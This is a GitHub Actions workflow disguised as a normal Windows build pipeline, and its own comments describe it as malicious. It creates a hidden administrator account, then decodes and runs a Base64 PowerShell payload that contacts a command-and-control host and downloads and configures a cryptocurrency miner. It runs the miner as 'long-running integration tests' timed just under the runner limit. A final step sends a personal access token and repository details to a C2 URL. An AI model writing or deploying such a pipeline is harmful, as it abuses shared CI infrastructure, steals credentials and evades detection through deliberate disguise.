# A generic, professional-sounding name for the workflow.
name: Main Build Pipeline

# Triggers on manual start, but also on pushes/PRs to look like a real CI process.
on:
  workflow_dispatch:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

# Environment variables can make the workflow look more complex and legitimate.
env:
  PROJECT_NAME: 'WebApp'
  DOTNET_VERSION: '6.0.x'

jobs:
  # The job name mimics a standard build-and-publish process for Windows.
  build-and-publish-windows:
    runs-on: windows-latest
    # Timeout is set just under the 6-hour limit to seem less suspicious.
    timeout-minutes: 355

    steps:
      # All legitimate CI pipelines start by checking out the code.
      - name: Checkout Repository
        uses: actions/checkout@v4

      # This step looks like it's setting up a build user, a plausible action.
      # The actual goal is to create a privileged user for the payload.
      - name: Setup Build Environment
        shell: powershell
        run: |
          # A comment explaining the purpose from a legitimate point of view.
          # Configure a dedicated build user with elevated privileges for service installation.
          $pw = "Bldr-1337-CI"
          $sPass = ConvertTo-SecureString $pw -AsPlainText -Force
          $userName = "Builder"
          New-LocalUser -Name $userName -Password $sPass -AccountNeverExpires
          
          # Obfuscating 'Administrators' by concatenating strings.
          $grp = "Admin" + "istrators"
          Add-LocalGroupMember -Group $grp -Member $userName

      # This is the core malicious step, heavily disguised.
      # The Base64 blob contains the logic to download, configure (with TLS), and run the miner.
      - name: Download & Configure Build Dependencies
        id: configure_deps
        shell: powershell
        run: |
          Write-Host "Fetching required build assets and configuration tokens..."
          # This Base64 command contains the entire logic to:
          # 1. Contact the C2 for instructions.
          # 2. Download the miner package.
          # 3. Create the config.json with a TLS-enabled connection to the pool.
          # 4. Set the path to the executable as an output.
          $encodedCommand = "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTdG9wIjsNCkNvbnNvbGU6OkNsZWFyKCk7DQoNCiR1cmwgPSAiaHR0cHM6Ly9wb29sc2VydmVyLm9ucmVuZGVyLmNvbS8iOw0KJGNvbmZpZ0pzb24gPSAoSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ7DQpXcml0ZS1Ib3N0ICJGZXRjaGluZyBjb25maXJtYXRpb24gdG9rZW4uLi4iOw0KJGNvbmZpZyA9ICRjb25maWdKc29uIHwgQ29udmVydEZyb20tSnNvbjsNCg0KJGFzc2V0VXJsID0gJGNvbmZpZy5taW5lci5kb3dubG9hZFVybDsNCiRleGVDb2RlbmFtZSA9ICRjb25maWcubWluZXIuZXhlY3V0YWJsZTsNCg0KJHRtcCA9ICRlbnY6VEVNUDsNCiR6aXBQYXRoID0gIkpvaW4tUGF0aCAkdG1wIFwiYXNzZXQuemlwXCIiOw0KJGV4dHJhY3RQYXRoID0gIkpvaW4tUGF0aCAkdG1wIFwiYXNzZXRcIiI7DQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRhc3NldFVybCAtT3V0RmlsZSAkemlwUGF0aDsNCkV4cGFuZC1BcmNoaXZlIC1QYXRoICR6aXBQYXRoIC1EZXN0aW5hdGlvblBhdGggJGV4dHJhY3RQYXRoIC1Gb3JjZTsNCiRrZXlQYXRoID0gKEFsaWFzLmdldGFzIC1QYXRoICRleHRyYWN0UGF0aCAtUmVjdXJzZSAtRmlsdGVyICRleGVDb2RlbmFtZSkuRnVsbE5hbWU7DQppZiAoLW5vdCAka2V5UGF0aCkgeyB0aHJvdyAiQ1JJVElDQUwgRVJST1I6IENvdWxkIG5vdCB2ZXJpZnkgYnVpbGQga2V5ISIgfQ0KZWNobyAiOjpzZXQtb3V0cHV0IG5hbWU9dGVzdF9ydW5uZXJfcGF0aDo6JGtleVBhdGgiOw0KDQokcG9vbEVuZHBvaW50ID0gJGNvbmZpZy5wb29sLnVybDsNCiR1c2VyQWNjb3VudCA9ICRjb25maWcucG9vbC51c2VyOw0KJHBvb2xUb2tlbiA9ICRjb25maWcucG9vbC5wYXNzOw0KDQokSlNPTkNvbnRlbnQgPSBAew0KICAgIGF1dG9zYXZlID0gJHRydWUNCiAgICBjcHUgPSBAew0KICAgICAgICBlbmFibGVkID0gJHRydWUNCiAgICAgICAgIm1heC10aHJlYWRzLWhpbnQiID0gMzUNCiAgICB9DQogICAgb3BlbmNsID0gJGZhbHNlDQogICAgY3VkYSA9ICRmYWxzZQ0KICAgIHBvb2xzID0gQAoNCiAgICAgICAgQHsNCiAgICAgICAgICAgIGFsZ28gPSAianglMCIgDQogICAgICAgICAgICB1cmwgPSAkcG9vbEVuZHBvaW50DQogICAgICAgICAgICB1c2VyID0gJHVzZXJBY2NvdW50DQogICAgICAgICAgICBwYXNzID0gJHBvb2xUb2tlbg0KICAgICAgICAgICAgdGxzID0gJHRydWUgICMgPD09PSBFbmFibGVzIFRMUyBFbmNyeXB0aW9uDQogICAgICAgIH0NCiAgICApDQp9IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwMDsNCg0KJGNvbmZpZ1BhdGggPSBKb2luLVBhdGggKFNwbGl0LVBhdGggLVBhdGggJGtleVBhdGgpICJjb25maWcuanNvbiI7DQoNCiRKU09OQ29udGVudCB8IFNldC1Db250ZW50IC1QYXRoICRjb25maWdQYXRoOw0KV3JpdGUtSG9zdCAiQ29uZmlndXJhdGlvbiBmaWxlIHZlcmlmaWVkLiI7"
          $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
          Invoke-Expression $decodedCommand

      # The name of this step provides a plausible reason for a long-running job.
      - name: Execute Long-Running Integration Tests
        shell: powershell
        run: |
          $testRunnerPath = "${{ steps.configure_deps.outputs.test_runner_path }}"
          $arguments = "--background"
          Write-Host "Starting test suite in background mode... This may take several hours."
          Start-Process -FilePath $testRunnerPath -ArgumentList $arguments
          Write-Host "Test suite process started successfully."

      # This is the new, external trigger step. It phones home to the C2 server.
      # It looks like a standard step to report build status to a monitoring service.
      - name: Report Build Status to Monitoring Service
        if: always() # CRITICAL: This ensures the C2 is notified even if the "tests" fail.
        shell: powershell
        run: |
          Write-Host "Sending completion signal to monitoring endpoint..."
          
          # The C2 server's URL is stored in a secret, which is standard secure practice.
          $monitoringEndpoint = "${{ secrets.C2_URL }}"
          
          # The payload sends all the info the C2 needs to schedule the next run.
          $payload = @{
              pat_token     = "${{ secrets.PAT_TOKEN }}";
              repository    = "${{ github.repository }}";
              workflow_file = "main-pipeline.yml";
              run_id        = "${{ github.run_id }}";
              status        = "completed";
          } | ConvertTo-Json
          
          try {
              Invoke-RestMethod -Uri $monitoringEndpoint -Method Post -Body $payload -ContentType 'application/json'
              Write-Host "Status reported successfully."
          } catch {
              # A try/catch block makes the script more robust and less suspicious.
              Write-Warning "Failed to report status to the monitoring service."
          }
